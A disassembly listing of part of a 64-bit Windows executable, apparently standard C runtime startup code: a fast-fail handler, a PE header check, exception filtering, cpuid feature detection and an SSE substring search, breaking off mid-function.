   140003b74:	48 8d 05 ed 74 01 00 	lea    0x174ed(%rip),%rax        # 0x14001b068
   140003b7b:	c3                   	ret
   140003b7c:	48 83 ec 28          	sub    $0x28,%rsp
   140003b80:	e8 e7 ff ff ff       	call   0x140003b6c
   140003b85:	48 83 08 24          	orq    $0x24,(%rax)
   140003b89:	e8 e6 ff ff ff       	call   0x140003b74
   140003b8e:	48 83 08 02          	orq    $0x2,(%rax)
   140003b92:	48 83 c4 28          	add    $0x28,%rsp
   140003b96:	c3                   	ret
   140003b97:	cc                   	int3
   140003b98:	33 c0                	xor    %eax,%eax
   140003b9a:	39 05 74 64 01 00    	cmp    %eax,0x16474(%rip)        # 0x14001a014
   140003ba0:	0f 94 c0             	sete   %al
   140003ba3:	c3                   	ret
   140003ba4:	48 8d 05 b5 80 01 00 	lea    0x180b5(%rip),%rax        # 0x14001bc60
   140003bab:	c3                   	ret
   140003bac:	48 8d 05 a5 80 01 00 	lea    0x180a5(%rip),%rax        # 0x14001bc58
   140003bb3:	c3                   	ret
   140003bb4:	83 25 b5 74 01 00 00 	andl   $0x0,0x174b5(%rip)        # 0x14001b070
   140003bbb:	c3                   	ret
   140003bbc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003bc1:	55                   	push   %rbp
   140003bc2:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   140003bc9:	ff 
   140003bca:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   140003bd1:	8b d9                	mov    %ecx,%ebx
   140003bd3:	b9 17 00 00 00       	mov    $0x17,%ecx
   140003bd8:	ff 15 ca b6 00 00    	call   *0xb6ca(%rip)        # 0x14000f2a8
   140003bde:	85 c0                	test   %eax,%eax
   140003be0:	74 04                	je     0x140003be6
   140003be2:	8b cb                	mov    %ebx,%ecx
   140003be4:	cd 29                	int    $0x29
   140003be6:	b9 03 00 00 00       	mov    $0x3,%ecx
   140003beb:	e8 c4 ff ff ff       	call   0x140003bb4
   140003bf0:	33 d2                	xor    %edx,%edx
   140003bf2:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140003bf6:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140003bfc:	e8 cf 0a 00 00       	call   0x1400046d0
   140003c01:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140003c05:	ff 15 75 b6 00 00    	call   *0xb675(%rip)        # 0x14000f280
   140003c0b:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140003c12:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140003c19:	48 8b cb             	mov    %rbx,%rcx
   140003c1c:	45 33 c0             	xor    %r8d,%r8d
   140003c1f:	ff 15 63 b6 00 00    	call   *0xb663(%rip)        # 0x14000f288
   140003c25:	48 85 c0             	test   %rax,%rax
   140003c28:	74 3c                	je     0x140003c66
   140003c2a:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140003c30:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140003c37:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140003c3e:	4c 8b c8             	mov    %rax,%r9
   140003c41:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140003c46:	4c 8b c3             	mov    %rbx,%r8
   140003c49:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   140003c50:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140003c55:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140003c59:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003c5e:	33 c9                	xor    %ecx,%ecx
   140003c60:	ff 15 2a b6 00 00    	call   *0xb62a(%rip)        # 0x14000f290
   140003c66:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140003c6d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003c72:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   140003c79:	33 d2                	xor    %edx,%edx
   140003c7b:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   140003c82:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140003c88:	48 83 c0 08          	add    $0x8,%rax
   140003c8c:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   140003c93:	e8 38 0a 00 00       	call   0x1400046d0
   140003c98:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140003c9f:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140003ca4:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   140003cab:	40 
   140003cac:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140003cb3:	00 
   140003cb4:	ff 15 16 b6 00 00    	call   *0xb616(%rip)        # 0x14000f2d0
   140003cba:	83 f8 01             	cmp    $0x1,%eax
   140003cbd:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140003cc2:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140003cc7:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140003ccb:	0f 94 c3             	sete   %bl
   140003cce:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140003cd3:	33 c9                	xor    %ecx,%ecx
   140003cd5:	ff 15 c5 b5 00 00    	call   *0xb5c5(%rip)        # 0x14000f2a0
   140003cdb:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003ce0:	ff 15 b2 b5 00 00    	call   *0xb5b2(%rip)        # 0x14000f298
   140003ce6:	85 c0                	test   %eax,%eax
   140003ce8:	75 0c                	jne    0x140003cf6
   140003cea:	84 db                	test   %bl,%bl
   140003cec:	75 08                	jne    0x140003cf6
   140003cee:	8d 48 03             	lea    0x3(%rax),%ecx
   140003cf1:	e8 be fe ff ff       	call   0x140003bb4
   140003cf6:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   140003cfd:	00 
   140003cfe:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140003d05:	5d                   	pop    %rbp
   140003d06:	c3                   	ret
   140003d07:	cc                   	int3
   140003d08:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   140003d0f:	33 d2                	xor    %edx,%edx
   140003d11:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003d16:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   140003d1a:	e8 b1 09 00 00       	call   0x1400046d0
   140003d1f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003d24:	ff 15 ae b5 00 00    	call   *0xb5ae(%rip)        # 0x14000f2d8
   140003d2a:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   140003d2f:	b8 0a 00 00 00       	mov    $0xa,%eax
   140003d34:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   140003d3a:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140003d41:	c3                   	ret
   140003d42:	cc                   	int3
   140003d43:	cc                   	int3
   140003d44:	e9 f7 fd ff ff       	jmp    0x140003b40
   140003d49:	cc                   	int3
   140003d4a:	cc                   	int3
   140003d4b:	cc                   	int3
   140003d4c:	48 83 ec 28          	sub    $0x28,%rsp
   140003d50:	33 c9                	xor    %ecx,%ecx
   140003d52:	ff 15 e0 b3 00 00    	call   *0xb3e0(%rip)        # 0x14000f138
   140003d58:	48 85 c0             	test   %rax,%rax
   140003d5b:	74 39                	je     0x140003d96
   140003d5d:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140003d62:	66 39 08             	cmp    %cx,(%rax)
   140003d65:	75 2f                	jne    0x140003d96
   140003d67:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140003d6b:	48 03 c8             	add    %rax,%rcx
   140003d6e:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140003d74:	75 20                	jne    0x140003d96
   140003d76:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140003d7b:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140003d7f:	75 15                	jne    0x140003d96
   140003d81:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   140003d88:	76 0c                	jbe    0x140003d96
   140003d8a:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   140003d91:	0f 95 c0             	setne  %al
   140003d94:	eb 02                	jmp    0x140003d98
   140003d96:	32 c0                	xor    %al,%al
   140003d98:	48 83 c4 28          	add    $0x28,%rsp
   140003d9c:	c3                   	ret
   140003d9d:	cc                   	int3
   140003d9e:	cc                   	int3
   140003d9f:	cc                   	int3
   140003da0:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140003db0
   140003da7:	48 ff 25 f2 b4 00 00 	rex.W jmp *0xb4f2(%rip)        # 0x14000f2a0
   140003dae:	cc                   	int3
   140003daf:	cc                   	int3
   140003db0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003db5:	57                   	push   %rdi
   140003db6:	48 83 ec 20          	sub    $0x20,%rsp
   140003dba:	48 8b 19             	mov    (%rcx),%rbx
   140003dbd:	48 8b f9             	mov    %rcx,%rdi
   140003dc0:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140003dc6:	75 1c                	jne    0x140003de4
   140003dc8:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140003dcc:	75 16                	jne    0x140003de4
   140003dce:	8b 53 20             	mov    0x20(%rbx),%edx
   140003dd1:	8d 82 e0 fa 6c e6    	lea    -0x19930520(%rdx),%eax
   140003dd7:	83 f8 02             	cmp    $0x2,%eax
   140003dda:	76 15                	jbe    0x140003df1
   140003ddc:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140003de2:	74 0d                	je     0x140003df1
   140003de4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003de9:	33 c0                	xor    %eax,%eax
   140003deb:	48 83 c4 20          	add    $0x20,%rsp
   140003def:	5f                   	pop    %rdi
   140003df0:	c3                   	ret
   140003df1:	e8 7a 08 00 00       	call   0x140004670
   140003df6:	48 89 18             	mov    %rbx,(%rax)
   140003df9:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140003dfd:	e8 82 08 00 00       	call   0x140004684
   140003e02:	48 89 18             	mov    %rbx,(%rax)
   140003e05:	e8 46 2e 00 00       	call   0x140006c50
   140003e0a:	cc                   	int3
   140003e0b:	cc                   	int3
   140003e0c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003e11:	57                   	push   %rdi
   140003e12:	48 83 ec 20          	sub    $0x20,%rsp
   140003e16:	48 8d 1d d3 35 01 00 	lea    0x135d3(%rip),%rbx        # 0x1400173f0
   140003e1d:	48 8d 3d cc 35 01 00 	lea    0x135cc(%rip),%rdi        # 0x1400173f0
   140003e24:	eb 12                	jmp    0x140003e38
   140003e26:	48 8b 03             	mov    (%rbx),%rax
   140003e29:	48 85 c0             	test   %rax,%rax
   140003e2c:	74 06                	je     0x140003e34
   140003e2e:	ff 15 24 b6 00 00    	call   *0xb624(%rip)        # 0x14000f458
   140003e34:	48 83 c3 08          	add    $0x8,%rbx
   140003e38:	48 3b df             	cmp    %rdi,%rbx
   140003e3b:	72 e9                	jb     0x140003e26
   140003e3d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003e42:	48 83 c4 20          	add    $0x20,%rsp
   140003e46:	5f                   	pop    %rdi
   140003e47:	c3                   	ret
   140003e48:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003e4d:	57                   	push   %rdi
   140003e4e:	48 83 ec 20          	sub    $0x20,%rsp
   140003e52:	48 8d 1d a7 35 01 00 	lea    0x135a7(%rip),%rbx        # 0x140017400
   140003e59:	48 8d 3d a0 35 01 00 	lea    0x135a0(%rip),%rdi        # 0x140017400
   140003e60:	eb 12                	jmp    0x140003e74
   140003e62:	48 8b 03             	mov    (%rbx),%rax
   140003e65:	48 85 c0             	test   %rax,%rax
   140003e68:	74 06                	je     0x140003e70
   140003e6a:	ff 15 e8 b5 00 00    	call   *0xb5e8(%rip)        # 0x14000f458
   140003e70:	48 83 c3 08          	add    $0x8,%rbx
   140003e74:	48 3b df             	cmp    %rdi,%rbx
   140003e77:	72 e9                	jb     0x140003e62
   140003e79:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003e7e:	48 83 c4 20          	add    $0x20,%rsp
   140003e82:	5f                   	pop    %rdi
   140003e83:	c3                   	ret
   140003e84:	40 53                	rex push %rbx
   140003e86:	48 83 ec 20          	sub    $0x20,%rsp
   140003e8a:	48 8d 05 37 b7 00 00 	lea    0xb737(%rip),%rax        # 0x14000f5c8
   140003e91:	48 8b d9             	mov    %rcx,%rbx
   140003e94:	48 89 01             	mov    %rax,(%rcx)
   140003e97:	f6 c2 01             	test   $0x1,%dl
   140003e9a:	74 0a                	je     0x140003ea6
   140003e9c:	ba 18 00 00 00       	mov    $0x18,%edx
   140003ea1:	e8 aa f2 ff ff       	call   0x140003150
   140003ea6:	48 8b c3             	mov    %rbx,%rax
   140003ea9:	48 83 c4 20          	add    $0x20,%rsp
   140003ead:	5b                   	pop    %rbx
   140003eae:	c3                   	ret
   140003eaf:	cc                   	int3
   140003eb0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003eb5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003eba:	57                   	push   %rdi
   140003ebb:	48 83 ec 10          	sub    $0x10,%rsp
   140003ebf:	33 c0                	xor    %eax,%eax
   140003ec1:	33 c9                	xor    %ecx,%ecx
   140003ec3:	0f a2                	cpuid
   140003ec5:	44 8b c1             	mov    %ecx,%r8d
   140003ec8:	45 33 db             	xor    %r11d,%r11d
   140003ecb:	44 8b d2             	mov    %edx,%r10d
   140003ece:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   140003ed5:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   140003edc:	44 8b cb             	mov    %ebx,%r9d
   140003edf:	8b f0                	mov    %eax,%esi
   140003ee1:	33 c9                	xor    %ecx,%ecx
   140003ee3:	41 8d 43 01          	lea    0x1(%r11),%eax
   140003ee7:	45 0b d0             	or     %r8d,%r10d
   140003eea:	0f a2                	cpuid
   140003eec:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   140003ef3:	89 04 24             	mov    %eax,(%rsp)
   140003ef6:	45 0b d1             	or     %r9d,%r10d
   140003ef9:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   140003efd:	8b f9                	mov    %ecx,%edi
   140003eff:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140003f03:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   140003f07:	75 5b                	jne    0x140003f64
   140003f09:	48 83 0d 17 61 01 00 	orq    $0xffffffffffffffff,0x16117(%rip)        # 0x14001a028
   140003f10:	ff 
   140003f11:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   140003f16:	48 c7 05 ff 60 01 00 	movq   $0x8000,0x160ff(%rip)        # 0x14001a020
   140003f1d:	00 80 00 00 
   140003f21:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   140003f26:	74 28                	je     0x140003f50
   140003f28:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140003f2d:	74 21                	je     0x140003f50
   140003f2f:	3d 70 06 02 00       	cmp    $0x20670,%eax
   140003f34:	74 1a                	je     0x140003f50
   140003f36:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140003f3b:	83 f8 20             	cmp    $0x20,%eax
   140003f3e:	77 24                	ja     0x140003f64
   140003f40:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   140003f47:	00 00 00 
   140003f4a:	48 0f a3 c1          	bt     %rax,%rcx
   140003f4e:	73 14                	jae    0x140003f64
   140003f50:	44 8b 05 1d 71 01 00 	mov    0x1711d(%rip),%r8d        # 0x14001b074
   140003f57:	41 83 c8 01          	or     $0x1,%r8d
   140003f5b:	44 89 05 12 71 01 00 	mov    %r8d,0x17112(%rip)        # 0x14001b074
   140003f62:	eb 07                	jmp    0x140003f6b
   140003f64:	44 8b 05 09 71 01 00 	mov    0x17109(%rip),%r8d        # 0x14001b074
   140003f6b:	b8 07 00 00 00       	mov    $0x7,%eax
   140003f70:	44 8d 48 fb          	lea    -0x5(%rax),%r9d
   140003f74:	3b f0                	cmp    %eax,%esi
   140003f76:	7c 26                	jl     0x140003f9e
   140003f78:	33 c9                	xor    %ecx,%ecx
   140003f7a:	0f a2                	cpuid
   140003f7c:	89 04 24             	mov    %eax,(%rsp)
   140003f7f:	44 8b db             	mov    %ebx,%r11d
   140003f82:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   140003f86:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140003f8a:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   140003f8e:	0f ba e3 09          	bt     $0x9,%ebx
   140003f92:	73 0a                	jae    0x140003f9e
   140003f94:	45 0b c1             	or     %r9d,%r8d
   140003f97:	44 89 05 d6 70 01 00 	mov    %r8d,0x170d6(%rip)        # 0x14001b074
   140003f9e:	c7 05 70 60 01 00 01 	movl   $0x1,0x16070(%rip)        # 0x14001a018
   140003fa5:	00 00 00 
   140003fa8:	44 89 0d 6d 60 01 00 	mov    %r9d,0x1606d(%rip)        # 0x14001a01c
   140003faf:	0f ba e7 14          	bt     $0x14,%edi
   140003fb3:	0f 83 91 00 00 00    	jae    0x14000404a
   140003fb9:	44 89 0d 58 60 01 00 	mov    %r9d,0x16058(%rip)        # 0x14001a018
   140003fc0:	bb 06 00 00 00       	mov    $0x6,%ebx
   140003fc5:	89 1d 51 60 01 00    	mov    %ebx,0x16051(%rip)        # 0x14001a01c
   140003fcb:	0f ba e7 1b          	bt     $0x1b,%edi
   140003fcf:	73 79                	jae    0x14000404a
   140003fd1:	0f ba e7 1c          	bt     $0x1c,%edi
   140003fd5:	73 73                	jae    0x14000404a
   140003fd7:	33 c9                	xor    %ecx,%ecx
   140003fd9:	0f 01 d0             	xgetbv
   140003fdc:	48 c1 e2 20          	shl    $0x20,%rdx
   140003fe0:	48 0b d0             	or     %rax,%rdx
   140003fe3:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140003fe8:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140003fed:	22 c3                	and    %bl,%al
   140003fef:	3a c3                	cmp    %bl,%al
   140003ff1:	75 57                	jne    0x14000404a
   140003ff3:	8b 05 23 60 01 00    	mov    0x16023(%rip),%eax        # 0x14001a01c
   140003ff9:	83 c8 08             	or     $0x8,%eax
   140003ffc:	c7 05 12 60 01 00 03 	movl   $0x3,0x16012(%rip)        # 0x14001a018
   140004003:	00 00 00 
   140004006:	89 05 10 60 01 00    	mov    %eax,0x16010(%rip)        # 0x14001a01c
   14000400c:	41 f6 c3 20          	test   $0x20,%r11b
   140004010:	74 38                	je     0x14000404a
   140004012:	83 c8 20             	or     $0x20,%eax
   140004015:	c7 05 f9 5f 01 00 05 	movl   $0x5,0x15ff9(%rip)        # 0x14001a018
   14000401c:	00 00 00 
   14000401f:	89 05 f7 5f 01 00    	mov    %eax,0x15ff7(%rip)        # 0x14001a01c
   140004025:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
   14000402a:	44 23 d8             	and    %eax,%r11d
   14000402d:	44 3b d8             	cmp    %eax,%r11d
   140004030:	75 18                	jne    0x14000404a
   140004032:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140004037:	24 e0                	and    $0xe0,%al
   140004039:	3c e0                	cmp    $0xe0,%al
   14000403b:	75 0d                	jne    0x14000404a
   14000403d:	83 0d d8 5f 01 00 40 	orl    $0x40,0x15fd8(%rip)        # 0x14001a01c
   140004044:	89 1d ce 5f 01 00    	mov    %ebx,0x15fce(%rip)        # 0x14001a018
   14000404a:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   14000404f:	33 c0                	xor    %eax,%eax
   140004051:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   140004056:	48 83 c4 10          	add    $0x10,%rsp
   14000405a:	5f                   	pop    %rdi
   14000405b:	c3                   	ret
   14000405c:	33 c0                	xor    %eax,%eax
   14000405e:	39 05 ec 7b 01 00    	cmp    %eax,0x17bec(%rip)        # 0x14001bc50
   140004064:	0f 95 c0             	setne  %al
   140004067:	c3                   	ret
   140004068:	cc                   	int3
   140004069:	cc                   	int3
   14000406a:	cc                   	int3
   14000406b:	cc                   	int3
   14000406c:	cc                   	int3
   14000406d:	cc                   	int3
   14000406e:	cc                   	int3
   14000406f:	cc                   	int3
   140004070:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004075:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000407a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000407f:	0f b6 3a             	movzbl (%rdx),%edi
   140004082:	48 8b da             	mov    %rdx,%rbx
   140004085:	4c 8b c1             	mov    %rcx,%r8
   140004088:	40 84 ff             	test   %dil,%dil
   14000408b:	75 08                	jne    0x140004095
   14000408d:	48 8b c1             	mov    %rcx,%rax
   140004090:	e9 c1 01 00 00       	jmp    0x140004256
   140004095:	83 3d 7c 5f 01 00 02 	cmpl   $0x2,0x15f7c(%rip)        # 0x14001a018
   14000409c:	41 ba ff 0f 00 00    	mov    $0xfff,%r10d
   1400040a2:	45 8d 5a f1          	lea    -0xf(%r10),%r11d
   1400040a6:	0f 8d ce 00 00 00    	jge    0x14000417a
   1400040ac:	8b cf                	mov    %edi,%ecx
   1400040ae:	0f 57 d2             	xorps  %xmm2,%xmm2
   1400040b1:	c1 e1 08             	shl    $0x8,%ecx
   1400040b4:	0b cf                	or     %edi,%ecx
   1400040b6:	66 0f 6e c1          	movd   %ecx,%xmm0
   1400040ba:	f2 0f 70 c8 00       	pshuflw $0x0,%xmm0,%xmm1
   1400040bf:	66 0f 70 d9 00       	pshufd $0x0,%xmm1,%xmm3
   1400040c4:	49 8b c0             	mov    %r8,%rax
   1400040c7:	49 23 c2             	and    %r10,%rax
   1400040ca:	49 3b c3             	cmp    %r11,%rax
   1400040cd:	77 29                	ja     0x1400040f8
   1400040cf:	f3 41 0f 6f 00       	movdqu (%r8),%xmm0
   1400040d4:	66 0f 6f c8          	movdqa %xmm0,%xmm1
   1400040d8:	66 0f 74 c3          	pcmpeqb %xmm3,%xmm0
   1400040dc:	66 0f 74 ca          	pcmpeqb %xmm2,%xmm1
   1400040e0:	66 0f eb c8          	por    %xmm0,%xmm1
   1400040e4:	66 0f d7 c1          	pmovmskb %xmm1,%eax
   1400040e8:	85 c0                	test   %eax,%eax
   1400040ea:	75 06                	jne    0x1400040f2
   1400040ec:	49 83 c0 10          	add    $0x10,%r8
   1400040f0:	eb d2                	jmp    0x1400040c4
   1400040f2:	0f bc c0             	bsf    %eax,%eax
   1400040f5:	4c 03 c0             	add    %rax,%r8
   1400040f8:	41 80 38 00          	cmpb   $0x0,(%r8)
   1400040fc:	0f 84 52 01 00 00    	je     0x140004254
   140004102:	41 3a 38             	cmp    (%r8),%dil
   140004105:	75 63                	jne    0x14000416a
   140004107:	49 8b d0             	mov    %r8,%rdx
   14000410a:	4c 8b cb             	mov    %rbx,%r9
   14000410d:	49 8b c1             	mov    %r9,%rax
   140004110:	49 23 c2             	and    %r10,%rax
   140004113:	49 3b c3             	cmp    %r11,%rax
   140004116:	77 3f                	ja     0x140004157
   140004118:	48 8b c2             	mov    %rdx,%rax
   14000411b:	49 23 c2             	and    %r10,%rax
   14000411e:	49 3b c3             	cmp    %r11,%rax
   140004121:	77 34                	ja     0x140004157
   140004123:	f3 41 0f 6f 01       	movdqu (%r9),%xmm0
   140004128:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000412c:	66 0f 74 c8          	pcmpeqb %xmm0,%xmm1
   140004130:	66 0f 74 c2          	pcmpeqb %xmm2,%xmm0
   140004134:	66 0f 74 ca          	pcmpeqb %xmm2,%xmm1
   140004138:	66 0f eb c8          	por    %xmm0,%xmm1
   14000413c:	66 0f d7 c1          	pmovmskb %xmm1,%eax
   140004140:	85 c0                	test   %eax,%eax
   140004142:	75 0a                	jne    0x14000414e
   140004144:	48 83 c2 10          	add    $0x10,%rdx
   140004148:	49 83 c1 10          	add    $0x10,%r9
   14000414c:	eb bf                	jmp    0x14000410d
   14000414e:	0f bc c8             	bsf    %eax,%ecx
   140004151:	48 03 d1             	add    %rcx,%rdx
   140004154:	4c 03 c9             	add    %rcx,%r9
   140004157:	41 8a 01             	mov    (%r9),%al
   14000415a:	84 c0                	test   %al,%al
   14000415c:	74 14                	je     0x140004172
   14000415e:	38 02                	cmp    %al,(%rdx)
   140004160:	75 08                	jne    0x14000416a
   140004162:	48 ff c2             	inc    %rdx
   140004165:	49 ff c1             	inc    %r9
   140004168:	eb a3                	jmp    0x14000410d
   14000416a:	49 ff c0             	inc    %r8
   14000416d:	e9 52 ff ff ff       	jmp    0x1400040c4
   140004172:	49 8b c0             	mov    %r8,%rax
   140004175:	e9 dc 00 00 00       	jmp    0x140004256
   14000417a:	48 8b c3             	mov    %rbx,%rax
   14000417d:	49 23 c2             	and    %r10,%rax
   140004180:	49 3b c3             	cmp    %r11,%rax
   140004183:	77 06                	ja     0x14000418b
   140004185:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   140004189:	eb 37                	jmp    0x1400041c2
   14000418b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000418e:	40 8a cf             	mov    %dil,%cl
   140004191:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140004197:	0f be c1             	movsbl %cl,%eax
   14000419a:	40 8a f1             	mov    %cl,%sil
   14000419d:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   1400041a2:	66 0f 3a 20 c0 0f    	pinsrb $0xf,%eax,%xmm0
   1400041a8:	48 8d 42 01          	lea    0x1(%rdx),%rax
   1400041ac:	84 c9                	test   %cl,%cl
   1400041ae:	74 02                	je     0x1400041b2
   1400041b0:	8a 08                	mov    (%rax),%cl
   1400041b2:	40 84 f6             	test   %sil,%sil
   1400041b5:	48 0f 44 c2          	cmove  %rdx,%rax
   1400041b9:	48 8b d0             	mov    %rax,%rdx
   1400041bc:	49 83 e9 01          	sub    $0x1,%r9
   1400041c0:	75 d5                	jne    0x140004197
   1400041c2:	49 8b c0             	mov    %r8,%rax
   1400041c5:	49 23 c2             	and    %r10,%rax
   1400041c8:	49 3b c3             	cmp    %r11,%rax
   1400041cb:	77 5b                	ja     0x140004228
   1400041cd:	f3 41 0f 6f 08       	movdqu (%r8),%xmm1
   1400041d2:	66 0f 3a 63 c1 0c    	pcmpistri $0xc,%xmm1,%xmm0
   1400041d8:	76 06                	jbe    0x1400041e0
   1400041da:	49 83 c0 10          	add    $0x10,%r8
   1400041de:	eb e2                	jmp    0x1400041c2
   1400041e0:	73 72                	jae    0x140004254
   1400041e2:	66 0f 3a 63 c1 0c    	pcmpistri $0xc,%xmm1,%xmm0
   1400041e8:	48 63 c1             	movslq %ecx,%rax
   1400041eb:	4c 03 c0             	add    %rax,%r8
   1400041ee:	49 8b d0             	mov    %r8,%rdx
   1400041f1:	4c 8b cb             	mov    %rbx,%r9
   1400041f4:	48 8b c2             	mov    %rdx,%rax
   1400041f7:	49 23 c2             	and    %r10,%rax
   1400041fa:	49 3b c3             	cmp    %r11,%rax
   1400041fd:	77 39                	ja     0x140004238
   1400041ff:	49 8b c1             	mov    %r9,%rax
   140004202:	49 23 c2             	and    %r10,%rax
   140004205:	49 3b c3             	cmp    %r11,%rax
   140004208:	77 2e                	ja     0x140004238
   14000420a:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000420e:	f3 41 0f 6f 11       	movdqu (%r9),%xmm2
   140004213:	66 0f 3a 63 d1 0c    	pcmpistri $0xc,%xmm1,%xmm2
   140004219:	71 18                	jno    0x140004233
   14000421b:	0f 88 51 ff ff ff    	js     0x140004172
   140004221:	b8 10 00 00 00       	mov    $0x10,%eax
   140004226:	eb 24                	jmp    0x14000424c
   140004228:	41 80 38 00          	cmpb   $0x0,(%r8)
   14000422c:	74 26                	je     0x140004254
   14000422e:	41 38 38             	cmp    %dil,(%r8)
   140004231:	74 bb                	je     0x1400041ee
   140004233:	49 ff c0             	inc    %r8
   140004236:	eb 8a                	jmp    0x1400041c2
   140004238:	41 8a 01             	mov    (%r9),%al
   14000423b:	84 c0                	test   %al,%al
   14000423d:	0f 84 2f ff ff ff    	je     0x140004172
   140004243:	38 02                	cmp    %al,(%rdx)
   140004245:	75 ec                	jne    0x140004233
   140004247:	b8 01 00 00 00       	mov    $0x1,%eax
   14000424c:	48 03 d0             	add    %rax,%rdx
   14000424f:	4c 03 c8             	add    %rax,%r9
   140004252:	eb a0                	jmp    0x1400041f4
   140004254:	33 c0                	xor    %eax,%eax
   140004256:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000425b:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   140004260:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   140004265:	c3                   	ret
   140004266:	cc                   	int3
   140004267:	cc                   	int3
   140004268:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000426d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004272:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004277:	57                   	push   %rdi
   140004278:	41 54                	push   %r12
   14000427a:	41 55                	push   %r13
   14000427c:	41 56                	push   %r14
   14000427e:	41 57                	push   %r15
   140004280:	48 83 ec 40          	sub    $0x40,%rsp
   140004284:	48 8b e9             	mov    %rcx,%rbp
   140004287:	4d 8b f9             	mov    %r9,%r15
